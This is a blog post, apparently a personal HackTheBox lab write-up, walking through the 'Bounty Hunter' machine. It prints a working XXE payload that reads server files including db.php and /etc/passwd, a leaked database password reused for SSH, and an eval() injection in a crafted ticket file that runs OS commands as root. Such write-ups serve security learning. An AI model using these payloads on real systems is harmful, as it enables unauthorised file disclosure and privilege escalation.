<!DOCTYPE html>
<html lang="en">
<head>
<title>Bounty Hunter :: RoundofThree</title>
<meta content="text/html; charset=utf-8" http-equiv="content-type"/>
<meta content="width=device-width, initial-scale=1.0" name="viewport"/>
<meta content="Rank: easy  These are the notes I took while attacking the machine. Note that it contains failed attempts that lead to dead ends but I edited them a bit to make the steps easier to follow.
Foothold 1- Nmap discovers ports 22 and 80.
# Nmap 7.91 scan initiated Mon Aug 2 03:22:27 2021 as: nmap -sC -sV -v -p- -oA nmap bountyhunter.htb Nmap scan report for bountyhunter.htb (10." name="description"/>
<meta content="[hacking kaggle blog resume hackthebox machine-learning reverse-engineering infosec]" name="keywords"/>
<meta content="noodp" name="robots"/>
<link href="/labs/bounty_hunter/" rel="canonical"/>
<link href="/assets/style.css" rel="stylesheet"/>
<link href="/img/apple-touch-icon-192x192.png" rel="apple-touch-icon"/>
<link href="/favicon.png" rel="shortcut icon"/>
<meta content="summary" name="twitter:card"/>
<meta content="" name="twitter:site"/>
<meta content="RoundofThree" name="twitter:creator"/>
<meta content="en" property="og:locale"/>
<meta content="article" property="og:type"/>
<meta content="Bounty Hunter" property="og:title"/>
<meta content="Rank: easy  These are the notes I took while attacking the machine. Note that it contains failed attempts that lead to dead ends but I edited them a bit to make the steps easier to follow.
Foothold 1- Nmap discovers ports 22 and 80.
# Nmap 7.91 scan initiated Mon Aug 2 03:22:27 2021 as: nmap -sC -sV -v -p- -oA nmap bountyhunter.htb Nmap scan report for bountyhunter.htb (10." property="og:description"/>
<meta content="/labs/bounty_hunter/" property="og:url"/>
<meta content="RoundofThree" property="og:site_name"/>
<meta content="/favicon.png" property="og:image"/>
<meta content="2048" property="og:image:width"/>
<meta content="1024" property="og:image:height"/>
<meta content="2021-09-07 12:36:57 +0200 +0200" property="article:published_time"/>
</head>
<body class="orange">
<div class="container center headings--one-size">
<header class="header">
<div class="header__inner">
<div class="header__logo">
<a href="/">
<div class="logo">
    RoundofThree
  </div>
</a>
</div>
<div class="menu-trigger">menu</div>
</div>
<nav class="menu">
<ul class="menu__inner menu__inner--desktop">
<li><a href="/general">General</a></li>
<li><a href="/labs">Labs</a></li>
<li><a href="/research">Research</a></li>
<li><a href="/">Whoami</a></li>
</ul>
<ul class="menu__inner menu__inner--mobile">
<li><a href="/general">General</a></li>
<li><a href="/labs">Labs</a></li>
<li><a href="/research">Research</a></li>
<li><a href="/">Whoami</a></li>
</ul>
</nav>
</header>
<form action="/search/" id="search" method="get">
<label for="search-input" hidden="">Search site</label>
<input id="search-input" name="query" placeholder="Type here to search" type="text"/>
<input type="submit" value="search"/>
</form>
<div class="content">
<div class="post">
<h1 class="post-title">
<a href="/labs/bounty_hunter/">Bounty Hunter</a></h1>
<div class="post-meta">
<span class="post-date">
        2021-09-07 
      </span>
<span class="post-author">:: RoundofThree</span>
</div>
<span class="post-tags">
    
    #<a href="/tags/hackthebox/">HackTheBox</a> 
    
  </span>
<div class="post-content"><div>
<ul>
<li>Rank: easy</li>
</ul>
<p>These are the notes I took while attacking the machine. Note that it contains failed attempts that lead to dead ends but I edited them a bit to make the steps easier to follow.</p>
<h2 id="foothold">Foothold<a arialabel="Anchor" class="hanchor" href="#foothold">⌗</a> </h2>
<p>1- Nmap discovers ports 22 and 80.</p>
<pre tabindex="0"><code># Nmap 7.91 scan initiated Mon Aug  2 03:22:27 2021 as: nmap -sC -sV -v -p- -oA nmap bountyhunter.htb
Nmap scan report for bountyhunter.htb (10.10.11.100)
Host is up (0.068s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 d4:4c:f5:79:9a:79:a3:b0:f1:66:25:52:c9:53:1f:e1 (RSA)
|   256 a2:1e:67:61:8d:2f:7a:37:a7:ba:3b:51:08:e8:89:a6 (ECDSA)
|_  256 a5:75:16:d9:69:58:50:4a:14:11:7a:42:c1:b6:23:44 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-favicon: Unknown favicon MD5: 556F31ACD686989B1AFCF382C05846AA
| http-methods: 
|_  Supported Methods: GET POST OPTIONS
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Bounty Hunters
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Aug  2 03:25:06 2021 -- 1 IP address (1 host up) scanned in 159.69 seconds
</code></pre><p>2- Web clues:
1- Copyright name is John –&gt; potential username.
2- Machine owner is a BurpSuite user.
3- HTML comments suggest we can configure the contact form email address by editing mail/contact_me.php line 19
4- 404 assets/mail/contact_me.js
5- Debugger files: resources folder –&gt; README.txt is a TODO list of things to fix –&gt; ‘test’ account, unhashed passwords, NOPASS enabled on DB, tracker.php not connected to DB. Because the DB port is not open, this is useless.
6- Portal under development at log_submit.php.</p>
<p>3- XSS failed at log_submit.php.</p>
<p>4- Inspect log_submit.php: bountySubmit() -&gt; see /resources/bountylog.js</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4" tabindex="0"><code class="language-js" data-lang="js"><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">returnSecret</span>(<span style="color:#a6e22e">data</span>) {
	<span style="color:#66d9ef">return</span> Promise.<span style="color:#a6e22e">resolve</span>(<span style="color:#a6e22e">$</span>.<span style="color:#a6e22e">ajax</span>({
            <span style="color:#a6e22e">type</span><span style="color:#f92672">:</span> <span style="color:#e6db74">"POST"</span>,
            <span style="color:#a6e22e">data</span><span style="color:#f92672">:</span> {<span style="color:#e6db74">"data"</span><span style="color:#f92672">:</span><span style="color:#a6e22e">data</span>},
            <span style="color:#a6e22e">url</span><span style="color:#f92672">:</span> <span style="color:#e6db74">"tracker_diRbPr00f314.php"</span>
            }));
}

<span style="color:#66d9ef">async</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">bountySubmit</span>() {
	<span style="color:#66d9ef">try</span> {
		<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">xml</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">`&lt;?xml  version="1.0" encoding="ISO-8859-1"?&gt;
</span><span style="color:#e6db74">		&lt;bugreport&gt;
</span><span style="color:#e6db74">		&lt;title&gt;</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">$</span>(<span style="color:#e6db74">'#exploitTitle'</span>).<span style="color:#a6e22e">val</span>()<span style="color:#e6db74">}</span><span style="color:#e6db74">&lt;/title&gt;
</span><span style="color:#e6db74">		&lt;cwe&gt;</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">$</span>(<span style="color:#e6db74">'#cwe'</span>).<span style="color:#a6e22e">val</span>()<span style="color:#e6db74">}</span><span style="color:#e6db74">&lt;/cwe&gt;
</span><span style="color:#e6db74">		&lt;cvss&gt;</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">$</span>(<span style="color:#e6db74">'#cvss'</span>).<span style="color:#a6e22e">val</span>()<span style="color:#e6db74">}</span><span style="color:#e6db74">&lt;/cvss&gt;
</span><span style="color:#e6db74">		&lt;reward&gt;</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">$</span>(<span style="color:#e6db74">'#reward'</span>).<span style="color:#a6e22e">val</span>()<span style="color:#e6db74">}</span><span style="color:#e6db74">&lt;/reward&gt;
</span><span style="color:#e6db74">		&lt;/bugreport&gt;`</span>
		<span style="color:#66d9ef">let</span> <span style="color:#a6e22e">data</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">returnSecret</span>(<span style="color:#a6e22e">btoa</span>(<span style="color:#a6e22e">xml</span>));
  		<span style="color:#a6e22e">$</span>(<span style="color:#e6db74">"#return"</span>).<span style="color:#a6e22e">html</span>(<span style="color:#a6e22e">data</span>)
	}
	<span style="color:#66d9ef">catch</span>(<span style="color:#a6e22e">error</span>) {
		<span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#e6db74">'Error:'</span>, <span style="color:#a6e22e">error</span>);
	}
}
</code></pre></div><p>5- XXE XML external entity injection to read db.php. Use the PHP filter to read arbitrary files:</p>
<pre tabindex="0"><code>php://filter/convert.base64-encode/resource=/var/www/html/db.php
</code></pre><p>Use the web developer console to run these commands that mimic a bounty submission.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4" tabindex="0"><code class="language-js" data-lang="js"><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">xml</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">`&lt;?xml version="1.0" encoding="ISO-8859-1"?&gt; &lt;!DOCTYPE foo [&lt;!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/db.php"&gt;] &gt; &lt;bugreport&gt;&lt;title&gt;&amp;xxe;&lt;/title&gt;&lt;cwe&gt;T&lt;/cwe&gt;&lt;cvss&gt;T&lt;/cvss&gt;&lt;reward&gt;T&lt;/reward&gt;&lt;/bugreport&gt;`</span>

<span style="color:#66d9ef">let</span> <span style="color:#a6e22e">data</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">returnSecret</span>(<span style="color:#a6e22e">btoa</span>(<span style="color:#a6e22e">xml</span>))
</code></pre></div><p>It returns:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4" tabindex="0"><code class="language-js" data-lang="js">Promise { <span style="color:#f92672">&lt;</span><span style="color:#a6e22e">state</span><span style="color:#f92672">&gt;:</span> <span style="color:#e6db74">"fulfilled"</span>, <span style="color:#f92672">&lt;</span><span style="color:#a6e22e">value</span><span style="color:#f92672">&gt;:</span> <span style="color:#e6db74">"If DB were ready, would have added:\n&lt;table&gt;\n  &lt;tr&gt;\n    &lt;td&gt;Title:&lt;/td&gt;\n    &lt;td&gt;PD9waHAKLy8gVE9ETyAtPiBJbXBsZW1lbnQgbG9naW4gc3lzdGVtIHdpdGggdGhlIGRhdGFiYXNlLgokZGJzZXJ2ZXIgPSAibG9jYWxob3N0IjsKJGRibmFtZSA9ICJib3VudHkiOwokZGJ1c2VybmFtZSA9ICJhZG1pbiI7CiRkYnBhc3N3b3JkID0gIm0xOVJvQVUwaFA0MUExc1RzcTZLIjsKJHRlc3R1c2VyID0gInRlc3QiOwo/Pgo=&lt;/td&gt;\n  &lt;/tr&gt;\n  &lt;tr&gt;\n    &lt;td&gt;CWE:&lt;/td&gt;\n    &lt;td&gt;T&lt;/td&gt;\n  &lt;/tr&gt;\n  &lt;tr&gt;\n    &lt;td&gt;Score:&lt;/td&gt;\n    &lt;td&gt;T&lt;/td&gt;\n  &lt;/tr&gt;\n  &lt;tr&gt;\n    &lt;td&gt;Reward:&lt;/td&gt;\n    &lt;td&gt;T&lt;/td&gt;\n  &lt;/tr&gt;\n&lt;/table&gt;\n"</span> }
</code></pre></div><p>6- Decode base64 of /var/www/html/db.php.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4" tabindex="0"><code class="language-php" data-lang="php"><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
<span style="color:#75715e">// TODO -&gt; Implement login system with the database.
</span><span style="color:#75715e"></span>$dbserver <span style="color:#f92672">=</span> <span style="color:#e6db74">"localhost"</span>;
$dbname <span style="color:#f92672">=</span> <span style="color:#e6db74">"bounty"</span>;
$dbusername <span style="color:#f92672">=</span> <span style="color:#e6db74">"admin"</span>;
$dbpassword <span style="color:#f92672">=</span> <span style="color:#e6db74">"m19RoAU0hP41A1sTsq6K"</span>;   <span style="color:#75715e">// --&gt; useful for password reuse 
</span><span style="color:#75715e"></span>$testuser <span style="color:#f92672">=</span> <span style="color:#e6db74">"test"</span>;
<span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
</span></code></pre></div><p>7- Use XXE to read /etc/passwd. See passwd file. The only users with /bin/bash are root and development. Reuse the dbpassword to ssh into them. Get user.txt.</p>
<p>passwd:</p>
<pre tabindex="0"><code>root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
sshd:x:111:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
development:x:1000:1000:Development:/home/development:/bin/bash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
</code></pre><h2 id="privilege-escalation">Privilege escalation<a arialabel="Anchor" class="hanchor" href="#privilege-escalation">⌗</a> </h2>
<p>8- Read contract.txt. Clues are: ‘I set up the permissions for you to test this.’. Let’s see the permissions with <code>sudo -l</code>. I can run <code>python tickerValidator.py</code> with sudo.</p>
<p>9- Potentials privesc ways: snap lxd privesc, sudo NOPASSWD python ticketValidator.py.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4" tabindex="0"><code class="language-python" data-lang="python"><span style="color:#75715e">#Skytrain Inc Ticket Validation System 0.1</span>
<span style="color:#75715e">#Do not distribute this file.</span>

<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">load_file</span>(loc):
    <span style="color:#66d9ef">if</span> loc<span style="color:#f92672">.</span>endswith(<span style="color:#e6db74">".md"</span>):
        <span style="color:#66d9ef">return</span> open(loc, <span style="color:#e6db74">'r'</span>)
    <span style="color:#66d9ef">else</span>:
        print(<span style="color:#e6db74">"Wrong file type."</span>)
        exit()

<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">evaluate</span>(ticketFile):
    <span style="color:#75715e">#Evaluates a ticket to check for ireggularities.</span>
    code_line <span style="color:#f92672">=</span> <span style="color:#66d9ef">None</span>
    <span style="color:#66d9ef">for</span> i,x <span style="color:#f92672">in</span> enumerate(ticketFile<span style="color:#f92672">.</span>readlines()):
        <span style="color:#66d9ef">if</span> i <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>:
            <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> x<span style="color:#f92672">.</span>startswith(<span style="color:#e6db74">"# Skytrain Inc"</span>):
                <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">False</span>
            <span style="color:#66d9ef">continue</span>
        <span style="color:#66d9ef">if</span> i <span style="color:#f92672">==</span> <span style="color:#ae81ff">1</span>:
            <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> x<span style="color:#f92672">.</span>startswith(<span style="color:#e6db74">"## Ticket to "</span>):
                <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">False</span>
            print(<span style="color:#e6db74">f</span><span style="color:#e6db74">"Destination: </span><span style="color:#e6db74">{</span><span style="color:#e6db74">' '</span><span style="color:#f92672">.</span>join(x<span style="color:#f92672">.</span>strip()<span style="color:#f92672">.</span>split(<span style="color:#e6db74">' '</span>)[<span style="color:#ae81ff">3</span>:])<span style="color:#e6db74">}</span><span style="color:#e6db74">"</span>)
            <span style="color:#66d9ef">continue</span>

        <span style="color:#66d9ef">if</span> x<span style="color:#f92672">.</span>startswith(<span style="color:#e6db74">"__Ticket Code:__"</span>):
            code_line <span style="color:#f92672">=</span> i<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>
            <span style="color:#66d9ef">continue</span>

        <span style="color:#66d9ef">if</span> code_line <span style="color:#f92672">and</span> i <span style="color:#f92672">==</span> code_line:
            <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> x<span style="color:#f92672">.</span>startswith(<span style="color:#e6db74">"**"</span>):
                <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">False</span>
            ticketCode <span style="color:#f92672">=</span> x<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">"**"</span>, <span style="color:#e6db74">""</span>)<span style="color:#f92672">.</span>split(<span style="color:#e6db74">"+"</span>)[<span style="color:#ae81ff">0</span>]
            <span style="color:#66d9ef">if</span> int(ticketCode) <span style="color:#f92672">%</span> <span style="color:#ae81ff">7</span> <span style="color:#f92672">==</span> <span style="color:#ae81ff">4</span>:
                validationNumber <span style="color:#f92672">=</span> eval(x<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">"**"</span>, <span style="color:#e6db74">""</span>))
                <span style="color:#66d9ef">if</span> validationNumber <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">100</span>:
                    <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">True</span>
                <span style="color:#66d9ef">else</span>:
                    <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">False</span>
    <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">False</span>

<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">main</span>():
    fileName <span style="color:#f92672">=</span> input(<span style="color:#e6db74">"Please enter the path to the ticket file.</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">"</span>)
    ticket <span style="color:#f92672">=</span> load_file(fileName)
    <span style="color:#75715e">#DEBUG print(ticket)</span>
    result <span style="color:#f92672">=</span> evaluate(ticket)
    <span style="color:#66d9ef">if</span> (result):
        print(<span style="color:#e6db74">"Valid ticket."</span>)
    <span style="color:#66d9ef">else</span>:
        print(<span style="color:#e6db74">"Invalid ticket."</span>)
    ticket<span style="color:#f92672">.</span>close

main()
</code></pre></div><p>10- Exploit the <code>eval()</code> statement to include <code>__import__('os').system('/bin/bash')</code>. Hand craft a ticket.md.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4" tabindex="0"><code class="language-md" data-lang="md"># Skytrain Inc
<span style="color:#75715e">## Ticket to 
</span><span style="color:#75715e"></span>__Ticket Code:__
**102+ 10 == 112 and <span style="font-weight:bold">__import__</span>('os').system('cat /root/root.txt') == False
</code></pre></div><p>11- Use the hand-crafted ticket to get root shell.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4" tabindex="0"><code class="language-bash" data-lang="bash">python ticketValidator.py ticket.md
</code></pre></div>
</div></div>
</div>
</div>
<footer class="footer">
<div class="footer__inner">
<div class="copyright copyright--user">
<span>© 2021 RoundofThree</span>
</div>
</div>
</footer>
<script src="/assets/main.js"></script>
<script src="/assets/prism.js"></script>
</div>
</body>
</html>
